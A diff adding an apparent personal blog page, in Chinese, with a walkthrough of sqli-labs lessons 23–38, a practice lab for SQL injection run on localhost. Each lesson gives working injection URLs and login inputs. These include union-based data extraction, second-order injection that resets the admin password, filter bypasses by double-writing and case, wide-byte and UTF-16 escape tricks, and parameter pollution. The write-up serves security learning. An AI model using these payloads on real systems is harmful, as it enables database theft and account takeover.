@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+	<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+    <meta name="description" content="龅牙晴在 Github 上的个人博客">
+    <meta name="keyword" content="安全，漏洞挖掘，漏洞复现">
+    <meta name="theme-color" content="#600090">
+    <meta name="msapplication-navbutton-color" content="#600090">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="#600090">
+    <link rel="shortcut icon" href="https://cdn4.iconfinder.com/data/icons/ionicons/512/icon-person-128.png">
+    <link rel="alternate" type="application/atom+xml" title="折戟" href="/atom.xml">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.css">
+    <title>
+        
+        Sqli-lab实验Task2（less23-38）｜R_song&#39;s blog
+        
+    </title>
+
+    <link rel="canonical" href="http://rliyuqing.github.io/2019/04/15/7. Sqli-lab实验Task2（less23-38）/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/blog-style.css">
+
+    <!-- Pygments Github CSS -->
+    <link rel="stylesheet" href="/css/syntax.css">
+</head>
+
+<style>
+
+    header.intro-header {
+        background-image: url('http://upload-images.jianshu.io/upload_images/6269327-c23742a390edde52.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240')
+    }
+</style>
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="" class="animated fadeIn">
+<!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost="true" data-istags="false
+" data-ishome="false">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand animated pulse" href="/">
+                <span class="brand-logo">
+                    折戟
+                </span>
+                's Blog
+            </a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <!-- /.navbar-collapse -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+					
+                    
+                        
+							
+                        <li>
+                            <a href="/categories/">categories</a>
+                        </li>
+							
+						
+                    
+                        
+							
+                        <li>
+                            <a href="/tags/">tags</a>
+                        </li>
+							
+						
+                    
+					
+					
+                </ul>
+            </div>
+        </div>
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+//    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+<!-- Main Content -->
+
+<!--only post-->
+
+
+<img class="wechat-title-img" src="http://upload-images.jianshu.io/upload_images/6269327-c23742a390edde52.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+
+<style>
+    
+    header.intro-header {
+        background-image: url('http://upload-images.jianshu.io/upload_images/6269327-c23742a390edde52.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240')
+    }
+
+    
+</style>
+
+<header class="intro-header">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <div class="post-heading">
+                    <h1>Sqli-lab实验Task2（less23-38）</h1>
+                    
+                    <span class="meta">
+                         作者 折戟
+                        <span>
+                          日期 2019-04-15
+                         </span>
+                    </span>
+                    <div class="tags text-center">
+                        
+                        <a class="tag" href="/tags/#sqli-labs" title="sqli-labs">sqli-labs</a>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="post-title-haojen">
+        <span>
+            Sqli-lab实验Task2（less23-38）
+        </span>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Container -->
+            <div class="col-lg-8 col-lg-offset-1 col-sm-9 post-container">
+                <h1 id="Sqli-labs实验Task2（less23-38）"><a href="#Sqli-labs实验Task2（less23-38）" class="headerlink" title="Sqli-labs实验Task2（less23-38）"></a>Sqli-labs实验Task2（less23-38）</h1><h2 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h2><p>进入实验页面可以看到又回到了最开始的类型，我们尝试一下有没有注入。<br>判断是否存在注入：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-23/?id=1’</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/6269327-d7b292138289ee69.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"><br>根据报错可以知道是使用单引号闭合的，继续测试。<br>猜测字段数：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-23/?id=1<span class="string">' order by 1 -- #</span></span><br></pre></td></tr></table></figure></p>
+<p>但是发现无论怎样都报错了，显示语句有错误，猜测并经过后面的源代码查看可知是代码将—和#的注释和转义了，所以才会出错，这个时候我们就只能对后面剩余的单引号进行闭合了。<br>敏感信息获取：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-23/?id=0<span class="string">' union select 1,user(),3 and '</span>1<span class="string">'='</span>1</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/6269327-91e33010b789f208.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"><br>这个比较简单，过滤了注释符号我们只需要注意闭合后面的单引号就行了</p>
+<h2 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h2><p>这个是一个登陆界面的注入测试，首先看到和之前有一些不一样，下面有忘记密码和新用户注册，忘记密码的页面一般是存在注入可能性比较高的地方，去这个页面试试 ：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-4092f625bac77a54.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.png"><br>这……这样子啊。还有一个注册界面，可以直接注册一个账号。<br>我们尝试在登陆界面进行注入测试，发现无法成功，很可能注入的点不在这。这个实验的题目叫做Second Degree injection，二次注入，思考思考，问题肯定没这么简单，我们先注册一个，然后登陆试试。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-17d9d83e29def919.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.png"><br>成功登陆后竟然还有修改密码的功能，放这里肯定没有，既然外面不能注入，那么很有可能在这里注入了。Have a try！<br>额，经过一些测试，发现还是不能注入，那么问题出在哪里呢？<br>进行代码审计看一下源代码：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">"username"</span>];</span><br><span class="line"><span class="variable">$curr_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">'current_password'</span>]);</span><br><span class="line"><span class="variable">$pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">'password'</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">'re_password'</span>]);</span><br></pre></td></tr></table></figure></p>
+<p>可以看到在pass_change.php这个文件里面没有对传入的username进行过滤。这样子，我们理一下思路，如果我们新注册一个用户名叫admin’ #然后我们登录了更改密码是不是就可以把admin 的密码改了呢？继续尝试一下。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-1e8417f64549fe12.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.png"><br>登录之后更改密码为123，然后登出。然后用admin和123登录。成功！<br><img src="http://upload-images.jianshu.io/upload_images/6269327-ba8f89ffde8a7144.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.png"><br>这个实验的思路特别巧妙，基本没有代码审计的话很难会找到注入的点，所以没有及其敏感的意识很难找到漏洞。</p>
+<h2 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h2><p>这个题很简单，我们一进页面就可以看到，告诉我们所以得or和and不能被使用，应该都被过滤了。这样有过一点经验的朋友一定很快就反应过来，这很简单了，绕过这种注释的方法有很多，比如编码转换或者大小写，双写绕过等，我们来试试看。<br>检查注入猜字段：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-25/?id=1’ order by 3 <span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/6269327-428e6b7578c97f4a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.png"><br>可以看到连order by里面的or都被过滤了。我们试试大小写绕过，发现不行，试试双写绕过：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-25/?id=1’ oorrder by 3 -- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/6269327-4f6f40b4deee6195.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.png"><br>哈哈，可以，这样就很简单了！后面的过程就都差不多了。</p>
+<h2 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h2><p>这个和上一个差不多，也是提示or和and被过滤了。就是没有报错，试试双写绕过：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-25a/?id=1 oorrder by 3 -- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
+<p>成功执行，试试敏感信息获取:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-25a/?id=0 union select user(),database(),1 -- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
+<p>可以看到成功获取了，这里和上一个差不多，用的or和and的时候双写绕过就行。这个和上一个不一样的地方就在于这里是盲注，没有报错，上一个可以根据报错判断一些东西。</p>
+<h2 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h2><p>这一次也是一样，我们的空格和注释不能用了，空格和注释被过滤了。试试用%20替换，发现也不行。注释也被过滤了那用注释绕过空格也不行了。换其他绕过方法试试。<br>测试过程中发现or和and还是继续被过滤所以记得双写。<br>试试利用括号绕过的盲注：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-26/?id=1<span class="string">'anandd(ascii(mid(user(),1,1))=114)anandd'</span>1<span class="string">'='</span>1</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/6269327-78361aa253e34dd0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="9.png"><br>成功绕过！这个是利用括号来绕过空格执行sql语句的方法，一般使用于盲注，可以看到我选择的是user用户名的第一个字符r的ascii码刚好对于114，成功输出。如果后面的条件不成立就不输出，这样就可以盲注啦。注意双字节绕过or和and。因为注释也被过滤了，所以也要注意对后面的引号进行闭合。</p>
+<h2 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h2><p>这个也是一样过滤了注释和空格。这个和上个差不多只是把报错给过滤了，使我们看不到报错，不过对于盲注来说这没有太大的影响，我们使用上一个的语句依旧可以注入！</p>
+<h2 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h2><p>这一次更狠，union和select被过滤了。经过简单的测试我们发现，这次没有过滤and，or，但过滤了空格和注释。<br>简单的测试一下：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-27/?id=1<span class="string">' and '</span>1<span class="string">'='</span>1</span><br></pre></td></tr></table></figure></p>
+<p>成功的，那么对于过滤了union和select。但是发现union双写可以绕过，select双写不行，但是大小写能绕过，那就很简单了，和之前的注入差不多：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-27/?id=1<span class="string">'and(ascii(mid(user(),1,1))=114)and'</span>1<span class="string">'='</span>1</span><br></pre></td></tr></table></figure></p>
+<p>语句和之前的差不多，主要是绕过空格的，而遇到有select和union的语句只需要大小写绕过就可以了！</p>
+<h2 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h2><p>原本以为这个和上个差不多，但是发现执行语句：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-27a/?id=1<span class="string">'and(ascii(mid(user(),1,1))=1144)and'</span>1<span class="string">'='</span>1</span><br></pre></td></tr></table></figure></p>
+<p>返回正常显示id=1的数据，无论我ascii的值输入多少都显示这个页面。<br>测试后发现这个闭合时双引号。换成语句：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-27a/?id=1<span class="string">"and(ascii(mid(user(),1,1))=114)and"</span>1<span class="string">"="</span>1</span><br></pre></td></tr></table></figure></p>
+<p>其他的和之前都差不多。</p>
+<h2 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h2><p>这一次可以根据页面提示看到union和select被过滤了。<br>尝试猜测闭合：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-28/?id=1<span class="string">')and('</span>1<span class="string">')=('</span>1</span><br></pre></td></tr></table></figure></p>
+<p>正常返回说明单引号闭合。且存在注入，过滤空格，注释。<br>获取数据：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-28/?id=1<span class="string">')and(ascii(mid(user(),1,1))=114)and('</span>1<span class="string">')=('</span>1</span><br></pre></td></tr></table></figure></p>
+<p>和27差不多。只是闭合方式不同</p>
+<h2 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h2><p>这里只有union和select被过滤，其他的都没被过滤。这个就更简单了，只需要绕过union和select就足够了，参考上面几个很容易就可以成功注入。<br>随便给一个例子：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-28a/?id=0<span class="string">') unionunion select select user(),database(),1 and ('</span>1<span class="string">')=('</span>1</span><br></pre></td></tr></table></figure></p>
+<h2 id="环境配置说明（less29-32）"><a href="#环境配置说明（less29-32）" class="headerlink" title="环境配置说明（less29-32）"></a>环境配置说明（less29-32）</h2><p>这四个实验使用到waf，基本原理可以看一下网上的一些博客，大多都有详细说明，比如：<a href="http://www.cnblogs.com/lcamry/p/5762961.html。" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/p/5762961.html。</a><br>因为我使用的是phpstudy，所以也大概说一下我是如何配的。</p>
+<ol>
+<li>下载tomcat，解压就行。</li>
+<li>将tomcat-files.zip解压到tomcat服务器webapp/ROOT目录下，并将29,30,31里的跳转url改为我们自己的。每个人不同，比如我的跳转url设置的是<a href="http://127.0.0.1/sqli-labs-master/Less-29/index.php?id=1。32里面要设置数据库的连接密码。" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs-master/Less-29/index.php?id=1。32里面要设置数据库的连接密码。</a></li>
+<li>下载安装好java环境，可在cmd输入javac测试。</li>
+<li>将下载的mysql-connector-java.jar文件放到tomcat解压文件夹的lib文件夹中</li>
+<li>点击tomcat/bin/startup.bat文件启动tomcat就可以啦。弹出的jar文件不能关掉，不然不能访问tomcat了。<br>然后我们就可以通过访问（tomcat默认开启8080端口）tomcat目录里面的四个实验进行测试了！<h2 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h2>可以看到这里页面提示是是使用了世界上最强大的waf，废话不多说我们之间进行挑战看一看。<br>首先判断闭合情况：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1:8080/sqli-labs/Less-29/index.jsp?id=1&amp;id=1<span class="string">'</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>稍微解释一下，因为我们是tomcat和apache两重的服务器端的，所以我们需要进行两个id的传参，那么如果前后两个传递的不相等会怎么样呢？<br><img src="http://upload-images.jianshu.io/upload_images/6269327-98eaa103a55ac1ee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="10.png"><br>如果是id=1&amp;id=2，那会显示什么呢？<br>apache（php）解析最后一个参数，即显示id=2的内容。Tomcat（jsp）解析第一个参数，即显示id=1的内容。<br>此处应该是id=2的内容，因为时间上提供服务的是apache（php）服务器，返回的数据也应该是apache处理的数据。<br>那么继续测试，我们使用单引号进行闭合了，看看页面相应：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-3a7f15d1c1247125.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="11.png"><br>已经很明显就知道是单引号闭合了。<br>后面其实就很简单了，获取敏感信息：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1:8080/sqli-labs/Less-29/index.jsp?id=1&amp;id=0<span class="string">'  union select 1,user(),database() -- #</span></span><br></pre></td></tr></table></figure></p>
+<p>很容易获取，但是虽然看着很简单，我们进行代码审计可以看到，这是因为jsp代码中只对tomcat的传参进行了过滤，并没有对后面apache传入的进行防范，所以很容易就成功了。<br>其他的可以自己构造语句进行测试。</p>
+<h2 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h2><p>这个和上个差不多，只不过把报错屏蔽了，把闭合换成了双引号。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1:8080/sqli-labs/Less-30/index.jsp?id=1&amp;id=0<span class="string">" union select 1,user(),database() -- #</span></span><br></pre></td></tr></table></figure></p>
+<p>其他可自己继续进行测试。</p>
+<h2 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h2><p>依旧差不多，有错误提示，闭合是双引号加括号。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1:8080/sqli-labs/Less-31/index.jsp?id=1&amp;id=0<span class="string">")  union select 1,user(),database() -- #</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h2><p>这一次不一样了，试了很多闭合发现依旧正常返回，第一个反应就是不是第二个传参，而是第一个传参，所以对第一个进行测试：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1:8080/sqli-labs/Less-32/index.jsp?id=1<span class="string">') -- #&amp;id=1</span></span><br></pre></td></tr></table></figure></p>
+<p>多试几次便可知道闭合方式是单引号加括号。<br>敏感信息获取：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1:8080/sqli-labs/Less-32/index.jsp?id=1<span class="string">') union select 1,user(),database() -- #&amp;id=1</span></span><br></pre></td></tr></table></figure></p>
+<p>突然发现这里还没有限制输出。。。</p>
+<h2 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h2><p>回到之前的apache的服务器的实验链接。<br>首先观察一下新的挑战的页面的提示多了一行。上面一行是我们的传参，下面一行是我们输入的十六进制编码之后的数，我们可以用hackbar进行hex encode看看1编码之后就是31。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-40010cf41481cfc4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="12.png"><br>闭合测试：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-33/?id=1<span class="string">'</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/6269327-0fb9ae426945eecd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="13.png"><br>果然，被过滤了，那么我们就考虑如何绕过这个过滤。在之前也遇到这样的问题我们试着绕过看看。这里是反斜杠过滤，可以看到下面的hex编码是5c，对于这个有着典型的绕过方法—宽字节注入。<br>大概说一说这个宽字节注入。我们的mysql在使用gbk编码的时候会将两个字符看成一个汉字（前一个字符的ascii码必须大于128才能到汉字的范围）。所以这个时候如果我们构造一个如下的：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-33/?id=1%df%27</span><br></pre></td></tr></table></figure></p>
+<p>就会报错！<br><img src="http://upload-images.jianshu.io/upload_images/6269327-fad023b8ea55aa37.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="14.png"><br><img src="http://upload-images.jianshu.io/upload_images/6269327-5f2444d84754947f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="15.png"><br>可以看到报错出现一个乱码，因为mysql不支持那个中文字符。同时后面的单引号也逃逸出来了，这就是因为mysql将%df%5c两个字符当成一个汉字来看，我们就绕过来这个反斜杠了。想要了解更多可以google宽字节输入看看。<br>敏感信息获取：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-33/?id=0%df%27 union select 1,user(),database() -- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h2><p>这次又回到了登录框的注入。<br>随便一个万能密码试试：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-f75d4532bf4a1e1e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="16.png"><br>果然，又是反斜杠过滤了，这里是post的传参，要过滤反斜杠，参考上面的。因为上面是url传参，所以可以用url编码构造宽字节绕过，但这里是post，我们是否可以构造其他的编码来绕过反斜杠呢？<br>这里我们使用另一种构造：将utf-8转换为utf-16或 utf-32进行过滤反斜杠。我们通过网上的工具，将utf-8的单引号转换成utf-16的：将’转为utf-16为�’，然后我们就可以用万能密码进行登录了。账号填：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ �<span class="string">'  or  1=1 -- #</span></span><br></pre></td></tr></table></figure></p>
+<p>密码随便填就可以成功登陆啦。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-7dde8e45775fbf9d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="17.png"><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">## Less-35</span><br><span class="line">有一个新挑战，尝试闭合发现被反斜杠过滤了，尝试宽字节注入，发现也不行！但是在测试的时候我们发现，这里的id是没有被闭合的。。。。所以直接就可以注入！</span><br><span class="line">``` bash</span><br><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-35/?id=0 union select 1,user(),database() -- #</span><br></pre></td></tr></table></figure></p>
+<p>这个比较简单，不要想多了。</p>
+<h2 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h2><p>这个和上面的差不多：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-36/?id=0%df%27 union select 1,user(),database() -- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
+<p>宽字节注入。<br>结合上面的我们也可以利用utf-16进行注入：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-36/?id=0%EF%BF%BD%27 union select 1,user(),database() -- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h2><p>这个和34的差不多,用户填：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ �<span class="string">'  or  1=1 -- #</span></span><br></pre></td></tr></table></figure></p>
+<p>密码随便填就可以成功登陆，原理和34差不多。只不过源码部分用不同的函数过滤。</p>
+<h2 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h2><p>emmmmmm这个也很简单：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-38/?id=0<span class="string">' union select 1,user(),database() -- #</span></span><br></pre></td></tr></table></figure></p>
+<p>基本都在前面出现过。<br>part2的部分也结束了，会尽快把后面的也写上来的！</p>
+
+                <hr>
+                
+
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/2019/04/15/26.python根据域名获取ip/" data-toggle="tooltip" data-placement="top" title="python根据域名获取ip">&larr; Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/2019/04/15/9. Sqli-lab实验Task4（less54-65）/" data-toggle="tooltip" data-placement="top" title="Sqli-labs实验Task4（less54-65）">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+                
+
+                
+
+
+                <!--加入新的评论系统-->
+                
+            </div>
+
+            <div class="hidden-xs col-sm-3 toc-col">
+                <div class="toc-wrap">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Sqli-labs实验Task2（less23-38）"><span class="toc-text">Sqli-labs实验Task2（less23-38）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-23"><span class="toc-text">Less-23</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-24"><span class="toc-text">Less-24</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-25"><span class="toc-text">Less-25</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-25a"><span class="toc-text">Less-25a</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-26"><span class="toc-text">Less-26</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-26a"><span class="toc-text">Less-26a</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-27"><span class="toc-text">Less-27</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-27a"><span class="toc-text">Less-27a</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-28"><span class="toc-text">Less-28</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-28a"><span class="toc-text">Less-28a</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#环境配置说明（less29-32）"><span class="toc-text">环境配置说明（less29-32）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-29"><span class="toc-text">Less-29</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-30"><span class="toc-text">Less-30</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-31"><span class="toc-text">Less-31</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-32"><span class="toc-text">Less-32</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-33"><span class="toc-text">Less-33</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-34"><span class="toc-text">Less-34</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-36"><span class="toc-text">Less-36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-37"><span class="toc-text">Less-37</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-38"><span class="toc-text">Less-38</span></a></li></ol></li></ol>
+                </div>
+            </div>
+        </div>
+
+        <div class="row">
+            <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5 class="text-center">
+                        <a href="/tags/">FEATURED TAGS</a>
+                    </h5>
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/#sqli-labs" title="sqli-labs">sqli-labs</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <div style="margin-top: 20px;">
+                    <h5 class="text-center">FRIENDS</h5>
+                    <ul class="list-inline text-center">
+                        
+                        <li><a href="https://teazmh.github.io/">Tea_Mh</a></li>
+                        
+                        <li><a href="https://zheng19970225.github.io/">让子弹飞一会</a></li>
+                        
+                        <li><a href="https://luckyjq.github.io/">LuckyQ</a></li>
+                        
+                    </ul>
+                </div>
+                
+            </div>
+        </div>
+
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- Footer -->
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <br>
+                <ul class="list-inline text-center">
+                
+                
+                    <li>
+                        <a target="_blank" href="https://twitter.com/IIGHJH5O4mvbeF9?s=09">
